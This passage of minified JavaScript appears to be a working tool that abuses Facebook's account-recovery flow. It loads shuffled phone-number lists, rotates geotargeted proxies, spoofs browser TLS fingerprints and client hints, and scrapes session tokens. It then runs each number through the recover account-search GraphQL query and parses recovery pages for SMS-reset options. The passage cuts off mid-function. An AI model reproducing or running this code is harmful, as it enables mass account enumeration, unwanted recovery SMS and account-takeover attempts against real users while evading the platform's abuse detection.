        _Bb.user && /_sid_/i.test(_Bb.user) && (_Bb.user = _Bb.user.replace(/_sid_[A-Za-z0-9]+/, '_sid_' + randomSessionId()));
    }
    if (this.autoCountry && _yb && _Bb.user) {
      const _Cb = detectCountry(_yb);
      if (_Cb) {
        const _Db = _Cb.toLowerCase();
        if (/[-_]country[-_][A-Za-z]{2}/i.test(_Bb.user))
          _Bb.user = _Bb.user.replace(/([-_]country[-_])[A-Za-z]{2}/i, '$1' + _Db);
        else
          /[-_]cc[-_][A-Za-z]{2}/i.test(_Bb.user) && (_Bb.user = _Bb.user.replace(/([-_]cc[-_])[A-Za-z]{2}/i, '$1' + _Db));
      }
    }
    return _Bb;
  }
  recordSuccess(_Eb) {
    this.proxyHits++;
  }
  recordFailure(_Fb) {
    this.proxyErrors++;
    const _Gb = _Fb % this.proxies.length;
    this.failureCounts[_Gb] = (this.failureCounts[_Gb] || 0) + 1;
    if (this.failureCounts[_Gb] >= 5)
      this.deadProxies.add(_Gb);
  }
  getStatus() {
    const _Hb = this.proxies.length - this.deadProxies.size;
    return _Hb + '/' + this.proxies.length + ' alive' + (this.autoCountry ? ' \xB7 Auto-Country' : '');
  }
  toUrl(_Ib) {
    const _Jb = _Ib.user ? encodeURIComponent(_Ib.user) + ':' + encodeURIComponent(_Ib.pass || '') + '@' : '';
    return (_Ib.type === 'socks5' ? 'socks5' : 'http') + '://' + _Jb + _Ib.host + ':' + _Ib.port;
  }
  async testConnectivity() {
    if (!this.hasProxies)
      return true;
    console.log(C('  \u2500\u2500 Proxy Connectivity Test \u2500\u2500'));
    const _Kb = this.getNext(), _Lb = extractProxyCountry(_Kb);
    if (_Lb) {
      console.log(G('  Zone: ' + Y(_Lb) + ' \u2192 TZ offset: ' + Y(getTimezoneOffset(_Lb)) + ' min'));
    }
    try {
      const _Mb = internalUA;
      let _Nb;
      const promise = new Promise((resolve5, reject3) => {
          _Nb = setTimeout(() => reject3(new Error('Proxy CONNECT timeout (20s)')), 20000);
        }), _Ob = await Promise.race([
          httpsGetPage('/login/identify/', '', 15000, 'www.facebook.com', _Kb, _Mb),
          promise
        ]);
      clearTimeout(_Nb);
      const _Pb = _Ob.status;
      if (_Pb >= 200 && _Pb < 400)
        return console.log(B('  \u2713 Proxy OK') + G(' \u2192 Facebook HTTP ' + _Pb) + G(' (' + _Kb.host + ':' + _Kb.port + ')')), true;
      console.log(R('  \u2717 Proxy \u2192 HTTP ' + _Pb));
    } catch (err9) {
      console.log(R('  \u2717 Proxy \u2192 ' + (err9.message || '').substring(0, 80)));
    }
    return false;
  }
}
const proxyManager = new ProxyManager();
function getProxy(_Qb) {
  return proxyManager.getNext(_Qb);
}
function proxyHttpsRequest(_Rb, _Sb, _Tb, _Ub = 15000) {
  return new Promise((resolve6, reject4) => {
    let _Vb;
    try {
      if (_Rb.type === 'socks5') {
        _Vb = createSocks5ProxyAgent(_Rb);
      } else
        _Vb = createHttpProxyAgent(_Rb);
    } catch (err10) {
      return reject4(new Error('Proxy agent init failed: ' + err10.message));
    }
    const _Wb = _Tb || '', opts34 = {
        'hostname': _Sb.hostname,
        'port': 443,
        'path': _Sb.path,
        'method': _Sb.method || 'GET',
        'headers': {
          ..._Sb.headers,
          'Host': _Sb.hostname
        },
        'agent': _Vb,
        'timeout': _Ub,
        'ciphers': 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA',
        'ecdhCurve': 'X25519:P-256:P-384',
        'honorCipherOrder': false,
        'secureOptions': require('crypto').constants.SSL_OP_NO_SSLv3 | require('crypto').constants.SSL_OP_NO_TLSv1 | require('crypto').constants.SSL_OP_NO_TLSv1_1
      };
    if (_Wb)
      opts34.headers['Content-Length'] = Buffer.byteLength(_Wb);
    dbg('[PROXY REQUEST] \u2192 http://' + _Rb.host + ':' + _Rb.port + ' | ' + _Sb.hostname + _Sb.path);
    const _Xb = https.request(opts34, _Yb => {
      const arr2 = [];
      _Yb.on('data', _Zb => {
        arr2.push(_Zb);
        trackBytes(_Zb.length);
      });
      _Yb.on('error', _ac => {
        try {
          reject4(_ac);
        } catch (err11) {
        }
      });
      _Yb.on('end', () => {
        dbg('[PROXY RESPONSE] HTTP ' + _Yb.statusCode + ' from ' + _Rb.host + ':' + _Rb.port);
        let _bc = Buffer.concat(arr2);
        const _cc = _Yb.headers['content-encoding'];
        if (_cc === 'gzip')
          try {
            _bc = zlib.gunzipSync(_bc);
          } catch (err12) {
          }
        else {
          if (_cc === 'deflate')
            try {
              _bc = zlib.inflateSync(_bc);
            } catch (err13) {
            }
          else {
            if (_cc === 'br')
              try {
                _bc = zlib.brotliDecompressSync(_bc);
              } catch (err14) {
              }
          }
        }
        resolve6({
          'status': _Yb.statusCode,
          'data': _bc.toString(),
          'location': _Yb.headers.location || null,
          'encoding': _cc || null,
          'headers': _Yb.headers
        });
      });
    });
    _Xb.on('error', _dc => {
      reject4(_dc);
    });
    _Xb.on('timeout', () => {
      _Xb.destroy();
      reject4(new Error('timeout'));
    });
    _Wb && (trackBytes(_Wb.length), _Xb.write(_Wb));
    _Xb.end();
  });
}
function ask(_ec) {
  const opts35 = {};
  opts35.input = process.stdin;
  opts35.output = process.stdout;
  const _fc = readline.createInterface(opts35);
  return new Promise(resolve7 => {
    _fc.question(_ec, _gc => {
      _fc.close();
      resolve7(_gc.trim());
    });
  });
}
function httpGet(_hc, _ic = 10000) {
  return new Promise((resolve8, reject5) => {
    const opts36 = {};
    opts36.timeout = _ic;
    const _jc = http.get(_hc, opts36, _kc => {
      let _lc = '';
      _kc.on('data', _mc => _lc += _mc);
      _kc.on('error', _nc => {
        try {
          reject5(_nc);
        } catch (err15) {
        }
      });
      _kc.on('end', () => {
        try {
          resolve8(JSON.parse(_lc));
        } catch (err16) {
          resolve8(_lc);
        }
      });
    });
    _jc.on('error', reject5);
    _jc.on('timeout', () => {
      _jc.destroy();
      reject5(new Error('timeout'));
    });
  });
}
function httpsGetPage(_oc, _pc, _qc = 15000, _rc = null, _sc = undefined, _tc = null) {
  const _uc = _rc || FB_HOST;
  const _vc = _sc !== null && _sc !== undefined ? _sc : getProxy(), _wc = _tc || globalUA;
  if (_vc) {
    return proxyHttpsRequest(_vc, {
      'hostname': _uc,
      'path': _oc,
      'method': 'GET',
      'headers': {
        'Cookie': _pc,
        'User-Agent': _wc.userAgent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': _tc && _tc.hostCtx ? _tc.hostCtx.lang : 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Referer': 'https://' + _uc + '/login/identify/',
        'Upgrade-Insecure-Requests': '1',
        ..._wc.clientHints,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1'
      }
    }, null, _qc).then(result => {
      if (result.status >= 300 && result.status < 400 && result.location) {
        let _xc = result.location;
        if (_xc.startsWith('/'))
          return httpsGetPage(_xc, _pc, _qc, _uc, _vc, _wc);
        try {
          const uRL3 = new URL(_xc);
          if (uRL3.hostname.includes('facebook.com'))
            return httpsGetPage(uRL3.pathname + uRL3.search, _pc, _qc, uRL3.hostname, _vc, _wc);
        } catch (err17) {
        }
        const opts37 = {};
        opts37.status = result.status;
        opts37.redirect = _xc;
        return opts37;
      }
      const opts38 = {};
      opts38.status = result.status;
      opts38.data = result.data;
      return opts38;
    });
  }
  return new Promise((resolve9, reject6) => {
    const opts39 = {};
    opts39.hostname = _uc;
    opts39.port = 443;
    opts39.path = _oc;
    opts39.method = 'GET';
    opts39.timeout = _qc;
    opts39.headers = {
      'Cookie': _pc,
      'User-Agent': _wc.userAgent,
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
      'Accept-Language': _tc && _tc.hostCtx ? _tc.hostCtx.lang : 'en-US,en;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      'Referer': 'https://' + _uc + '/login/identify/',
      'Upgrade-Insecure-Requests': '1',
      ..._wc.clientHints
    };
    opts39.headers['sec-fetch-dest'] = 'document';
    opts39.headers['sec-fetch-mode'] = 'navigate';
    opts39.headers['sec-fetch-site'] = 'same-origin';
    opts39.headers['sec-fetch-user'] = '?1';
    const _yc = opts39;
    const _zc = https.request(_yc, _Ac => {
      if (_Ac.statusCode >= 300 && _Ac.statusCode < 400 && _Ac.headers.location) {
        let _Bc = _Ac.headers.location;
        _Ac.resume();
        if (_Bc.startsWith('/'))
          return httpsGetPage(_Bc, _pc, _qc, _uc, _sc, _wc).then(resolve9).catch(reject6);
        try {
          const uRL4 = new URL(_Bc);
          if (uRL4.hostname.includes('facebook.com')) {
            return httpsGetPage(uRL4.pathname + uRL4.search, _pc, _qc, uRL4.hostname, _sc, _wc).then(resolve9).catch(reject6);
          }
        } catch (err18) {
        }
        const opts40 = {};
        opts40.status = _Ac.statusCode;
        opts40.redirect = _Bc;
        return resolve9(opts40);
      }
      const arr3 = [];
      _Ac.on('data', _Cc => arr3.push(_Cc));
      _Ac.on('error', _Dc => {
        try {
          reject6(_Dc);
        } catch (err19) {
        }
      });
      _Ac.on('end', () => {
        let _Ec = Buffer.concat(arr3);
        if (_Ac.headers['content-encoding'] === 'gzip') {
          try {
            _Ec = zlib.gunzipSync(_Ec);
          } catch (err20) {
          }
        } else {
          if (_Ac.headers['content-encoding'] === 'deflate') {
            try {
              _Ec = zlib.inflateSync(_Ec);
            } catch (err21) {
            }
          } else {
            if (_Ac.headers['content-encoding'] === 'br')
              try {
                _Ec = zlib.brotliDecompressSync(_Ec);
              } catch (err22) {
              }
          }
        }
        resolve9({
          'status': _Ac.statusCode,
          'data': _Ec.toString()
        });
      });
    });
    _zc.on('error', reject6);
    _zc.on('timeout', () => {
      _zc.destroy();
      reject6(new Error('timeout'));
    });
    _zc.end();
  });
}
function graphqlPost(_Fc, _Gc, _Hc = 15000, _Ic = undefined, _Jc = 'www.facebook.com') {
  const _Kc = _Ic !== null && _Ic !== undefined ? _Ic : getProxy();
  const _Lc = _Jc || 'www.facebook.com';
  if (_Kc) {
    const opts41 = { ..._Gc };
    return proxyHttpsRequest(_Kc, {
      'hostname': _Lc,
      'path': '/api/graphql/',
      'method': 'POST',
      'headers': opts41
    }, _Fc.toString(), _Hc);
  }
  return new Promise((resolve10, reject7) => {
    const _Mc = _Fc.toString(), opts42 = {
        'hostname': _Lc,
        'port': 443,
        'path': '/api/graphql/',
        'method': 'POST',
        'headers': {
          ..._Gc,
          'Content-Length': Buffer.byteLength(_Mc),
          'Accept-Encoding': 'gzip, deflate, br'
        },
        'timeout': _Hc
      }, _Nc = https.request(opts42, _Oc => {
        const arr4 = [];
        _Oc.on('data', _Pc => {
          arr4.push(_Pc);
          trackBytes(_Pc.length);
        });
        _Oc.on('error', _Qc => {
          try {
            reject7(_Qc);
          } catch (err23) {
          }
        });
        _Oc.on('end', () => {
          let _Rc = Buffer.concat(arr4);
          const _Sc = _Oc.headers['content-encoding'];
          if (_Sc === 'gzip')
            try {
              _Rc = zlib.gunzipSync(_Rc);
            } catch (err24) {
            }
          else {
            if (_Sc === 'deflate') {
              try {
                _Rc = zlib.inflateSync(_Rc);
              } catch (err25) {
              }
            } else {
              if (_Sc === 'br')
                try {
                  _Rc = zlib.brotliDecompressSync(_Rc);
                } catch (err26) {
                }
            }
          }
          resolve10({
            'status': _Oc.statusCode,
            'data': _Rc.toString()
          });
        });
      });
    _Nc.on('error', reject7);
    _Nc.on('timeout', () => {
      _Nc.destroy();
      reject7(new Error('timeout'));
    });
    trackBytes(_Mc.length);
    _Nc.write(_Mc);
    _Nc.end();
  });
}
async function seedSession(_Tc = null, _Uc = null, _Vc = null, _Wc = () => {
}) {
  return new Promise((resolve11, reject8) => {
    const _Xc = _Tc !== null ? _Tc : proxyManager.hasProxies ? proxyManager.getNext() : null, _Yc = _Vc || {
        'host': 'www.facebook.com',
        'locale': 'en_US',
        'lang': 'en-US,en;q=0.9'
      };
    if (_Xc) {
      const _Zc = _Uc || globalUA, _ad = _Yc.host, _bd = (_cd, _dd, _ed) => {
          proxyHttpsRequest(_Xc, {
            'hostname': _cd,
            'path': _dd,
            'method': 'GET',
            'headers': {
              'User-Agent': _Zc.userAgent,
              'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
              'Accept-Language': _Yc.lang,
              'Accept-Encoding': 'gzip, deflate, br',
              'Referer': 'https://' + _cd + '/login/identify/',
              'Upgrade-Insecure-Requests': '1',
              ..._Zc.clientHints,
              'sec-fetch-dest': 'document',
              'sec-fetch-mode': 'navigate',
              'sec-fetch-site': 'same-origin',
              'sec-fetch-user': '?1'
            }
          }, null, 15000).then(result2 => {
            if ((result2.status === 301 || result2.status === 302) && result2.location && _ed > 0) {
              let _fd = _cd, _gd = result2.location;
              if (result2.location.startsWith('http'))
                try {
                  const uRL5 = new URL(result2.location);
                  _fd = uRL5.hostname, _gd = uRL5.pathname + uRL5.search;
                } catch (err27) {
                }
              _bd(_fd, _gd, _ed - 1);
            } else
              _Yc.host = _cd, _hd(result2.data, result2.status, result2.headers);
          }).catch(reject8);
        };
      _bd(_ad, '/login/identify/', 5);
    } else {
      const _id = _Uc || globalUA, _jd = _Yc.host, _kd = (_ld, _md, _nd) => {
          const opts43 = {};
          opts43.hostname = _ld;
          opts43.port = 443;
          opts43.path = _md;
          opts43.method = 'GET';
          opts43.headers = {
            'User-Agent': _id.userAgent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': _Yc.lang,
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://' + _ld + '/login/identify/',
            'Upgrade-Insecure-Requests': '1',
            'connection': 'keep-alive',
            ..._id.clientHints
          };
          opts43.timeout = 15000;
          opts43.headers['sec-fetch-dest'] = 'document';
          opts43.headers['sec-fetch-mode'] = 'navigate';
          opts43.headers['sec-fetch-site'] = 'same-origin';
          opts43.headers['sec-fetch-user'] = '?1';
          const _od = opts43, _pd = https.request(_od, _qd => {
              if ((_qd.statusCode === 301 || _qd.statusCode === 302) && _qd.headers.location && _nd > 0) {
                _qd.resume();
                let _rd = _ld, _sd = _qd.headers.location;
                if (_qd.headers.location.startsWith('http')) {
                  try {
                    const uRL6 = new URL(_qd.headers.location);
                    _rd = uRL6.hostname;
                    _sd = uRL6.pathname + uRL6.search;
                  } catch (err28) {
                  }
                }
                _kd(_rd, _sd, _nd - 1);
              } else {
                const arr5 = [];
                _qd.on('data', _td => arr5.push(_td));
                _qd.on('error', _ud => {
                  try {
                    reject8(_ud);
                  } catch (err29) {
                  }
                });
                _qd.on('end', () => {
                  let _vd = Buffer.concat(arr5);
                  const _wd = _qd.headers['content-encoding'];
                  if (_wd === 'gzip')
                    try {
                      _vd = zlib.gunzipSync(_vd);
                    } catch (err30) {
                    }
                  else {
                    if (_wd === 'deflate') {
                      try {
                        _vd = zlib.inflateSync(_vd);
                      } catch (err31) {
                      }
                    } else {
                      if (_wd === 'br')
                        try {
                          _vd = zlib.brotliDecompressSync(_vd);
                        } catch (err32) {
                        }
                    }
                  }
                  _Yc.host = _ld;
                  _hd(_vd.toString(), _qd.statusCode, _qd.headers);
                });
              }
            });
          _pd.on('timeout', () => {
            _pd.destroy();
            reject8(new Error('Timeout seeding session'));
          });
          _pd.on('error', _xd => {
            reject8(_xd);
          });
          _pd.end();
        };
      _kd(_jd, '/login/identify/', 5);
    }
    function _hd(_yd, _zd, _Ad = {}) {
      if (_zd !== 200) {
        reject8(new Error('Session seed HTTP ' + _zd));
        return;
      }
      const opts44 = {}, _Bd = _Ad['set-cookie'] || _Ad['Set-Cookie'];
      if (_Bd) {
        const _Cd = Array.isArray(_Bd) ? _Bd : [_Bd];
        _Cd.forEach(item5 => {
          const parts5 = item5.split(';')[0].split('=');
          if (parts5.length >= 2) {
            const _Dd = parts5[0].trim(), _Ed = parts5.slice(1).join('=').trim();
            opts44[_Dd] = _Ed;
          }
        });
      }
      if (_yd && _yd.includes('datr')) {
        const match4 = _yd.match(/"datr":"([^"]+)"/);
        if (match4)
          opts44.datr = match4[1];
      }
      !opts44.datr && (opts44.datr = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15));
      const _Fd = _Gd => {
          const match5 = _yd.match(_Gd);
          return match5 ? match5[1] : '';
        }, opts45 = {};
      opts45.lsd = _Fd(/"LSD",\[\],\{"token":"([^"]+)"/) || _Fd(/name="lsd"\s+value="([^"]+)"/) || _Fd(/"token":"([^"]+)"/);
      opts45.hsi = _Fd(/"hsi":"(\d+)"/) || _Fd(/"hsi":(\d+)/) || '0';
      opts45.rev = _Fd(/"server_revision":(\d+)/) || '10111213';
      opts45.spinB = _Fd(/"__spin_b":"([^"]+)"/) || 'trunk';
      opts45.spinT = _Fd(/"__spin_t":(\d+)/) || String(Math.floor(Date.now() / 1000));
      opts45.__hs = _Fd(/"__hs":"([^"]+)"/) || '19700';
      opts45.__comet_req = _Fd(/"__comet_req":(\d+)/) || '15';
      opts45.__ccg = _Fd(/"__ccg":"([^"]+)"/) || 'EXCELLENT';
      opts45.__dyn = _Fd(/"__dyn":"([^"]+)"/) || '';
      opts45.__csr = _Fd(/"__csr":"([^"]+)"/) || '';
      if (!opts45.lsd) {
        reject8(new Error('Failed to initialize session'));
        return;
      }
      let _Hd = 2;
      const _Id = opts44.datr || '';
      for (let _Jd = 0; _Jd < _Id.length; _Jd++)
        _Hd += _Id.charCodeAt(_Jd);
      resolve11({
        ...opts45,
        'jazoest': String(_Hd),
        'cookies': opts44,
        'cookieHeader': Object.entries(opts44).map(([_Kd, _Ld]) => _Kd + '=' + _Ld).join('; '),
        'hostCtx': _Yc
      });
    }
  });
}
function loadNumbers(_Md) {
  if (!_Md || !fs.existsSync(_Md)) {
    process.exit(1);
  }
  const _Nd = fs.readFileSync(_Md, 'utf8').split(/\r?\n/).map(item6 => item6.trim()).filter(item7 => item7 && /^\+?\d{7,15}$/.test(item7));
  for (let _Od = _Nd.length - 1; _Od > 0; _Od--) {
    const _Pd = Math.floor(Math.random() * (_Od + 1));
    [_Nd[_Od], _Nd[_Pd]] = [
      _Nd[_Pd],
      _Nd[_Od]
    ];
  }
  return _Nd;
}
function buildParams(_Qd, _Rd, _Sd, _Td, _Ud) {
  const uRLSearchParams = new URLSearchParams();
  uRLSearchParams.set('av', '0');
  uRLSearchParams.set('__user', '0');
  uRLSearchParams.set('__a', '1');
  uRLSearchParams.set('__comet_req', _Qd.__comet_req);
  uRLSearchParams.set('__hs', _Qd.__hs);
  uRLSearchParams.set('__hsi', _Qd.hsi);
  uRLSearchParams.set('__rev', _Qd.rev);
  uRLSearchParams.set('__spin_r', _Qd.rev);
  uRLSearchParams.set('__spin_b', _Qd.spinB);
  uRLSearchParams.set('__spin_t', _Qd.spinT);
  uRLSearchParams.set('dpr', '1');
  uRLSearchParams.set('__ccg', _Qd.__ccg);
  uRLSearchParams.set('lsd', _Qd.lsd);
  uRLSearchParams.set('jazoest', _Qd.jazoest);
  uRLSearchParams.set('locale', _Qd.hostCtx ? _Qd.hostCtx.locale : 'en_US');
  const _Vd = _Ud !== undefined && _Ud !== null ? -_Ud : new Date().getTimezoneOffset();
  uRLSearchParams.set('__timezone', String(_Vd));
  uRLSearchParams.set('fb_api_caller_class', 'RelayModern');
  uRLSearchParams.set('fb_api_req_friendly_name', _Sd);
  uRLSearchParams.set('server_timestamps', 'true');
  uRLSearchParams.set('variables', JSON.stringify(_Td));
  uRLSearchParams.set('doc_id', _Rd);
  return uRLSearchParams;
}
function buildHeaders(_Wd, _Xd) {
  const _Yd = _Xd || globalUA, opts46 = {};
  opts46.host = 'www.facebook.com';
  opts46.lang = 'en-US,en;q=0.9';
  const _Zd = _Wd.hostCtx || opts46, _ae = _Zd.host === 'www.facebook.com', opts47 = {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Cookie': _Wd.cookieHeader,
      'User-Agent': _Yd.userAgent,
      'Accept-Language': _Zd.lang,
      'Referer': 'https://' + _Zd.host + '/login/identify/',
      'Origin': 'https://' + _Zd.host,
      'X-FB-LSD': _Wd.lsd,
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': _ae ? 'same-origin' : 'same-site',
      ..._Yd.clientHints
    };
  return opts47;
}
function httpsPostPage(_be, _ce, _de, _ee = 15000, _fe = null, _ge = undefined, _he = null, _ie = null) {
  const _je = _fe || FB_HOST, _ke = _ge !== null && _ge !== undefined ? _ge : getProxy(), _le = _he || globalUA, _me = _ie || 'https://' + _je + '/login/identify/', opts48 = {
      'Cookie': _de,
      'User-Agent': _le.userAgent,
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
      'Accept-Language': _he && _he.hostCtx ? _he.hostCtx.lang : 'en-US,en;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      'Referer': _me,
      'Upgrade-Insecure-Requests': '1',
      'Content-Type': 'application/x-www-form-urlencoded',
      ..._le.clientHints
    };
  opts48['sec-fetch-dest'] = 'document';
  opts48['sec-fetch-mode'] = 'navigate';
  opts48['sec-fetch-site'] = 'same-origin';
  opts48['sec-fetch-user'] = '?1';
  const _ne = opts48;
  if (_ke)
    return proxyHttpsRequest(_ke, {
      'hostname': _je,
      'path': _be,
      'method': 'POST',
      'headers': _ne
    }, _ce, _ee).then(result3 => {
      if (result3.status >= 300 && result3.status < 400 && result3.location) {
        const opts49 = {};
        opts49.status = result3.status;
        opts49.redirect = result3.location;
        return opts49;
      }
      const opts50 = {};
      opts50.status = result3.status;
      opts50.data = result3.data;
      return opts50;
    });
  return new Promise((resolve12, reject9) => {
    _ne['Content-Length'] = Buffer.byteLength(_ce);
    const opts51 = {};
    opts51.hostname = _je;
    opts51.port = 443;
    opts51.path = _be;
    opts51.method = 'POST';
    opts51.timeout = _ee;
    opts51.headers = _ne;
    const _oe = opts51, _pe = https.request(_oe, _qe => {
        const arr6 = [];
        _qe.on('data', _re => {
          arr6.push(_re);
          trackBytes(_re.length);
        });
        _qe.on('error', _se => {
          try {
            reject9(_se);
          } catch (err33) {
          }
        });
        _qe.on('end', () => {
          if (_qe.statusCode >= 300 && _qe.statusCode < 400 && _qe.headers.location) {
            const opts52 = {};
            opts52.status = _qe.statusCode;
            opts52.redirect = _qe.headers.location;
            return resolve12(opts52);
          }
          let _te = Buffer.concat(arr6);
          const _ue = _qe.headers['content-encoding'];
          if (_ue === 'gzip')
            try {
              _te = zlib.gunzipSync(_te);
            } catch (err34) {
            }
          else {
            if (_ue === 'deflate') {
              try {
                _te = zlib.inflateSync(_te);
              } catch (err35) {
              }
            } else {
              if (_ue === 'br') {
                try {
                  _te = zlib.brotliDecompressSync(_te);
                } catch (err36) {
                }
              }
            }
          }
          resolve12({
            'status': _qe.statusCode,
            'data': _te.toString()
          });
        });
      });
    _pe.on('error', reject9);
    _pe.on('timeout', () => {
      _pe.destroy();
      reject9(new Error('timeout'));
    });
    _pe.write(_ce);
    _pe.end();
  });
}
function parseResp(_ve) {
  _ve = String(_ve).replace(/^for \(;;\);/, '');
  try {
    return JSON.parse(_ve);
  } catch (err37) {
    return null;
  }
}
async function searchAccount(_we, _xe, _ye, _ze, _Ae) {
  const _Be = uuid(), _Ce = uuid(), _De = buildParams(_xe, DOC_SEARCH, 'CAAFBAccountSearchViewQuery', {
      'params': {
        'cipher_text': null,
        'context': 'recover',
        'event_request_id': _Ce,
        'friend_name': '',
        'search_query': _we,
        'waterfall_id': _Be
      }
    }, _Ae), _Ee = await graphqlPost(_De, buildHeaders(_xe, _ze), 15000, _ye, _xe.hostCtx.host);
  const _Fe = parseResp(_Ee.data);
  if (_Ee.status !== 200)
    return {
      'ok': false,
      'error': 'HTTP ' + _Ee.status
    };
  const opts53 = {};
  opts53.ok = false;
  opts53.error = 'Parse failed';
  if (!_Fe)
    return opts53;
  if (_Fe.errors) {
    dbg('+' + _we + ' GRAPHQL ERROR: ' + JSON.stringify(_Fe.errors));
    const opts54 = {};
    opts54.ok = false;
    opts54.error = 'GraphQL error';
    return opts54;
  }
  const _Ge = _Fe?.data?.caa_ar_fb_account_search;
  if (!_Ge || !_Ge.accounts || _Ge.accounts.length === 0) {
    dbg('+' + _we + ' SEARCH FAIL: no_account');
    const opts55 = {};
    opts55.ok = false;
    opts55.result = 'no_account';
    return opts55;
  }
  dbg('[SEARCH PAYLOAD DUMP] ' + JSON.stringify(_Ge.accounts));
  const opts56 = {};
  opts56.ok = true;
  opts56.redirectUri = _Ge.redirect_uri;
  opts56.accounts = _Ge.accounts;
  opts56.wfId = _Be;
  opts56.evId = _Ce;
  return opts56;
}
async function getCipher(_He, _Ie, _Je, _Ke) {
  let _Le = _He || '/recover/initiate/';
  try {
    if (_He && !_He.startsWith('/')) {
      const uRL7 = new URL(_He);
      _Le = uRL7.pathname + uRL7.search;
    }
  } catch (err38) {
  }
  const _Me = 'm.facebook.com';
  dbg('GET CIPHER PAGE \u2192 https://' + _Me + _Le);
  const _Ne = await httpsGetPage(_Le, _Ie.cookieHeader, 15000, _Me, _Je, _Ke);
  if (_Ne.status !== 200)
    return {
      'ok': false,
      'error': 'Page HTTP ' + _Ne.status
    };
  const _Oe = _Ne.data || '';
  try {
    require('fs').writeFileSync('cipher_page_' + _Me + '.html', _Oe);
  } catch (err39) {
  }
  const opts57 = {};
  const _Pe = _Oe.matchAll(/<input[^>]+name=["']([^"']+)["'][^>]+value=["']([^"']*)['"]/gi);
  for (const _Qe of _Pe) {
    opts57[_Qe[1]] = _Qe[2];
  }
  const _Re = _Oe.matchAll(/<input[^>]+value=["']([^"']*)["'][^>]+name=["']([^"']+)["']/gi);
  for (const _Se of _Re) {
    if (!opts57[_Se[2]])
      opts57[_Se[2]] = _Se[1];
  }
  const match6 = _Oe.match(/"LSD",\[\],\{"token":"([^"]+)"\}/);
  match6 && !opts57.lsd && (opts57.lsd = match6[1]);
  const match7 = _Oe.match(/"dtsg":\{"token":"([^"]+)"/);
  match7 && !opts57.fb_dtsg && (opts57.fb_dtsg = match7[1]);
  if (opts57.fb_dtsg && !opts57.jazoest) {
    let _Te = 0;
    for (let _Ue = 0; _Ue < opts57.fb_dtsg.length; _Ue++) {
      _Te += opts57.fb_dtsg.charCodeAt(_Ue);
    }
    opts57.jazoest = '2' + _Te;
  }
  if (!opts57.lsd && _Ie.lsd)
    opts57.lsd = _Ie.lsd;
  if (!opts57.jazoest && _Ie.jazoest)
    opts57.jazoest = _Ie.jazoest;
  if (!opts57.fb_dtsg && _Ie.fb_dtsg)
    opts57.fb_dtsg = _Ie.fb_dtsg;
  const match8 = _Oe.match(/<form[^>]+action=["']([^"']+)["']/i), _Ve = match8 ? match8[1].replace(/&amp;/g, '&') : null;
  let _We = null;
  if (_He) {
    const match9 = _He.match(/[?&]ci=([^&]+)/);
    if (match9)
      _We = match9[1];
  }
  let _Xe = null;
  const _Ye = _Oe.match(/"cipher"\s*:\s*"([^"]+)"/i) || _Oe.match(/"ci"\s*:\s*"([^"]+)"/i);
  _Ye && (_Xe = _Ye[1]);
  const _Ze = opts57.c || _Xe || _We;
  let _af = null;
  const _bf = _Oe.matchAll(/name=["'](recover_method|RecoveryOptions)["'][^>]+value=["'](send_sms:[^"']+)["']/gi);
  for (const _cf of _bf) {
    _af = _cf[2];
    break;
  }
  if (!_af) {
    const _df = _Oe.matchAll(/value=["'](send_sms:[^"']+)["'][^>]+name=["'](recover_method|RecoveryOptions)["']/gi);
    for (const _ef of _df) {
      _af = _ef[1];
      break;
    }
  }
  if (!_af) {
    const match10 = _Oe.match(/"key"\s*:\s*"(send_sms:[^"]+)"/i);
    match10 && (_af = match10[1]);
  }
  if (!_af && opts57.RecoveryOptions && opts57.RecoveryOptions.startsWith('send_sms')) {
    _af = opts57.RecoveryOptions;
  }
  !_af && opts57.recover_method && opts57.recover_method.startsWith('send_sms') && (_af = opts57.recover_method);
  if (!_af) {
    const _ff = /send_sms/i.test(_Oe) || /"preselected_cp"\s*:\s*"send_sms/i.test(_Oe) || /"key"\s*:\s*"send_sms/i.test(_Oe);
    if (_ff)
      _af = 'send_sms';
    else {
      dbg('+' + _He + ' CIPHER: No SMS recovery option found in HTML page');
      const opts58 = {};
      opts58.ok = false;
      opts58.error = 'no_sms';
      return opts58;
    }
  }
  let _gf = null;
  const match11 = _Oe.match(/"cuid"\s*:\s*"([^"]+)"/i);
  match11 && (_gf = match11[1]);
  if (Object.keys(opts57).length > 0) {
    dbg('TOKENS EXTRACTED: ' + Object.keys(opts57).length + ' fields (' + Object.keys(opts57).join(', ') + ')');
    const opts59 = {};
    opts59.ok = true;
    opts59.cipher = _Ze;
    opts59.cuid = _gf;
    opts59.inputs = opts57;
    opts59.recover_method = _af;
    opts59.initiateUrl = _Le;
    opts59.formAction = _Ve;
    opts59.mHost = _Me;
    opts59.fallbackUaData = _Ke;
    return opts59;
  }
  if (_We) {
    dbg('TOKENS FALLBACK: Using cipher from URL only');
    const opts60 = {};
    opts60.ok = true;
    opts60.cipher = _We;
    opts60.cuid = _gf;
    opts60.inputs = {};
    opts60.recover_method = _af;
    opts60.initiateUrl = _Le;
    opts60.formAction = null;
